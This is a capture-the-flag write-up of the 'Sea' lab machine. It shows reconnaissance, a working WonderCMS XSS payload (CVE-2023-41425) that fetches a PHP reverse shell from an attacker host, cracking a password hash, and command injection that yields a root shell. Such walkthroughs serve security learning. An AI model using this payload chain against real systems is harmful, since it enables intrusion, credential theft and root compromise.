![Sea](https://github.com/user-attachments/assets/ef892494-6f55-4d4b-a929-7128923a934e)

## Reconnaissance & port scanning
Starting with nmap scan:
```bash
# Nmap 7.94SVN scan initiated Thu Oct 10 10:05:28 2024 as: nmap -v -sV -sC --open -vvv -oA logs/initial_recon/initial 10.10.11.28
Nmap scan report for 10.10.11.28 (10.10.11.28)
Host is up, received conn-refused (0.038s latency).
Scanned at 2024-10-10 10:05:28 CEST for 9s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZDkHH698ON6uxM3eFCVttoRXc1PMUSj8hDaiwlDlii0p8K8+6UOqhJno4Iti+VlIcHEc2THRsyhFdWAygICYaNoPsJ0nhkZsLkFyu/lmW7frIwINgdNXJOLnVSMWEdBWvVU7owy+9jpdm4AHAj6mu8vcPiuJ39YwBInzuCEhbNPncrgvXB1J4dEsQQAO4+KVH+QZ5ZCVm1pjXTjsFcStBtakBMykgReUX9GQJ9Y2D2XcqVyLPxrT98rYy+n5fV5OE7+J9aiUHccdZVngsGC1CXbbCT2jBRByxEMn+Hl+GI/r6Wi0IEbSY4mdesq8IHBmzw1T24A74SLrPYS9UDGSxEdB5rU6P3t91rOR3CvWQ1pdCZwkwC4S+kT35v32L8TH08Sw4Iiq806D6L2sUNORrhKBa5jQ7kGsjygTf0uahQ+g9GNTFkjLspjtTlZbJZCWsz2v0hG+fzDfKEpfC55/FhD5EDbwGKRfuL/YnZUPzywsheq1H7F0xTRTdr4w0At8=
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMMoxImb/cXq07mVspMdCWkVQUTq96f6rKz6j5qFBfFnBkdjc07QzVuwhYZ61PX1Dm/PsAKW0VJfw/mctYsMwjM=
|   256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHuXW9Vi0myIh6MhZ28W8FeJo0FRKNduQvcSzUAkWw7z
80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Sea - Home
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Oct 10 10:05:37 2024 -- 1 IP address (1 host up) scanned in 9.35 seconds
```

The machine is hosting the web application. After adding it to the `/etc/hosts`, I've conducted manual exploration of the site.

The website is small and have only some endpoints. One of them is linked on one of the pages:

![01-initial_page](https://github.com/user-attachments/assets/11418270-09e9-420e-a43b-381149a9e2a4)

The `contact` form is simple and discloses, that the website is using `php` as the back-end technology.

![02-contact_form](https://github.com/user-attachments/assets/8af6dcf7-990c-410d-96d8-0a38ff9d9a03)

I've performed some tests on the form, but as the form does not return any parameterized response (like custom 'Thank you!, \<name>' notification), the form can be vulnerable to blind attacks (unlikely on 'Easy' level) or needs more recon. 

Interestingly, there is some kind of 'victim' user that visits provided Website, as I've been able to confirm it by providing URL to controlled server:

![03-victim_reaction](https://github.com/user-attachments/assets/be776b89-ffc0-433b-977b-1536f3696e45)

This behavior can be leveraged in order to gain initial foothold, but will require additional vulnerability discovered.

### CMS disclosure
When exploring the site map, I've found a custom directory `/themes/bike`. As this looks pretty custom, it is worth to take a shot and fuzz the contents. The most difficult part was the correct wordlist, but once it was found, the scanning returned some interesting information about the website:

```bash
> ffuf -w /usr/share/SecLists/Discovery/Web-Content/quickhits.txt:FUZZ -u http://sea.htb/themes/bike/FUZZ | grep 'Status: 200'

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sea.htb/themes/bike/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

README.md               [Status: 200, Size: 318, Words: 40, Lines: 16, Duration: 71ms]
sym/root/home/          [Status: 200, Size: 3650, Words: 582, Lines: 87, Duration: 66ms]
version                 [Status: 200, Size: 6, Words: 1, Lines: 2, Duration: 40ms]
:: Progress: [2565/2565] :: Job [1/1] :: 632 req/sec :: Duration: [0:00:07] :: Errors: 0 ::

```

Requesting the `README.md` disclosed the used CMS framework:

![04-information_disclosure](https://github.com/user-attachments/assets/824f879e-d5f6-43fe-8c18-ce029c728949)

Curling the `version` returned a version of the CMS:
```bash
> curl http://sea.htb/themes/bike/version                                                 
3.2.0
```

With this knowledge I've been able to find potential vulnerability [CVE-2023-41425](https://nvd.nist.gov/vuln/detail/CVE-2023-41425).
## Initial foothold
According to research, the vulnerability arises in WonderCMS versions 3.2.0 to 3.4.2 and is a Cross-Site Scripting vulnerability that allwos the attacker to perform malicious actions like cookie exfiltration or unauthorized requests to attacker-controlled host. In short, the exploit uses **installModule** component of the framework.
In order for attack to work, I created a custom javascript payload that requests for a zipped php reverse shell (i.e. [PentestMonkey php revshell](https://github.com/pentestmonkey/php-reverse-shell)). The paylaod utilizes the know vulnerability:
```js
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", "http://sea.htb/?installModule=http://xx.xx.xx.xx/rev.zip&directoryName=random&type=themes&token=" + document.querySelectorAll('[name="token"]')[0].value;);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", "http://sea.htb/themes/php-reverse-shell.php");
   xhr4.send();
 }
};
```

Then we create out listeners, the file server and netcat listener. After passing the payload to the target:

![05-exploit](https://github.com/user-attachments/assets/2bf245b6-85b4-4d12-837b-eba46370ad49)

We are getting a request for a javascript payload:
```bash
> python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.28 - - [11/Oct/2024 10:40:48] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [11/Oct/2024 10:40:56] "GET /rev.zip HTTP/1.1" 200 -
```

The payload was requested by the target and then executed:
```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.28] 36738
Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
 08:40:58 up 43 min,  0 users,  load average: 0.95, 1.11, 1.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

With this, I've acquired initial access to the machine.

## Lateral movement
### Standard user
As the landing user is `www-data`, the permissions are insufficient to read the first user flag. 

There are two standard users, that can be potential targets of lateral movement:
```bash
www-data@sea:/$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash

```

We can't access the contents of the user `geo`, but we can perform `ls` on user `amay` (which suggests that this user is a next target).

With some recon performed, I've located a file named `database.js`, that contains a has of a password:
```bash
www-data@sea:/var/www/sea/data$ cat database.js 
{
    "config": {
        "siteTitle": "Sea",
        "theme": "bike",
        "defaultPage": "home",
        "login": "loginURL",
        "forceLogout": false,
        "forceHttps": false,
        "saveChangesPopup": false,
        "password": "$2y$10$****************************************************Xm4q",
        "lastLogins": {
            "2024\/10\/11 08:40:47": "127.0.0.1",
            "2024\/10\/11 08:34:17": "127.0.0.1",
            "2024\/10\/11 08:32:46": "127.0.0.1",
            "2024\/10\/11 08:25:16": "127.0.0.1",
            "2024\/10\/11 08:21:46": "127.0.0.1"
        },

...SNIP...
```

The hash is easily crackable after removing backslash characters
```bash
> john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash1
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
m**********e (?)     
1g 0:00:00:58 DONE (2024-10-11 10:57) 0.01702g/s 52.08p/s 52.08c/s 52.08C/s iamcool..memories
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

And I've got access to the user with permissions to flag:
```bash
> ssh amay@10.10.11.28
amay@10.10.11.28's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 11 Oct 2024 08:58:08 AM UTC

  System load:  1.24              Processes:             262
  Usage of /:   63.7% of 6.51GB   Users logged in:       0
  Memory usage: 14%               IPv4 address for eth0: 10.10.11.28
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Mon Aug  5 07:16:49 2024 from xx.xx.xx.xx
amay@sea:~$ 
```
## Privileges escalation
### Command Injection
Examination of the running services and used ports revealed, that the machine is hosting internal application on port 8080:
```bash
amay@sea:~$ netstat -tulpn
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -    
```

After forwarding the application, I've been able to access it in my browser. The website asked for login and password, `amay` credentials worked.

![06-internal_app](https://github.com/user-attachments/assets/1ddf2ed6-b57b-451e-bfd5-cf0382fc5a37)

The application allows performing some management operations on the host, like reading files and performing updates. Configuration like this commonly can be vulnerable to file disclosures or even Command Injection attacks and is high-value target, as operations like updates require root access to the machine - it is very likely that the application is running with root privileges. Unsurprisingly, we got a evidence for the existence of this vulnerability by using Out-of-Band method with `wget`:

![08-CI_confirmation](https://github.com/user-attachments/assets/20c9ec08-4650-4cf6-922c-646a7d5c6503)

With this knowledge, we can simply send the content of the root flag to the listener or just read the flag. I've managed to spawn a bash reverse shell, which gave root access to the machine.

![09-payload](https://github.com/user-attachments/assets/c1ddf4dc-6d38-4514-87bd-0e750e37693f)

```bash
> nc -lnvp 1234
listening on [any] 1234 ...
connect to [xx.xx.xx.xx] from (UNKNOWN) [10.10.11.28] 47860
bash: cannot set terminal process group (26064): Inappropriate ioctl for device
bash: no job control in this shell
root@sea:~/monitoring# id
id
uid=0(root) gid=0(root) groups=0(root)
root@sea:~/monitoring#
```
